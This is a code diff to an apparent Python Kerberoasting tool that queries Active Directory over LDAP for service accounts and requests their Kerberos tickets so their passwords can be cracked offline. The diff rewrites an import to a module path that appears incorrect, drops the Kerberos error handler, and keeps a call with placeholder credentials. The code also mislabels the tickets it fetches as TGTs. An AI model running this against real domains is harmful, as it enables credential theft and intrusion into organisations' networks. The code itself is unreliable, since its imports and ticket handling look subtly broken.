@@ -1,4 +1,4 @@
-from impacket.krb5 import getKerberosTGT, KerberosError
+from impacket.krb5.asn1 import getKerberosTGT, AP_REQ
 from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES
 
 def find_kerberoastable_users(username, password, domain, dc_ip):
@@ -43,12 +43,8 @@ def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
             # Output the obtained TGT
             print(f"Kerberoast ticket for user {user}:\n{tgt}\n")
 
-    except KerberosError as ke:
-        print(f"Kerberos error during Kerberoasting: {ke}")
     except Exception as e:
         print(f"Error during Kerberoasting: {e}")
-
-# Example usage:
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
 kerberoast_kerberoastable_users("username", "password", "domain", "dc_ip")
 
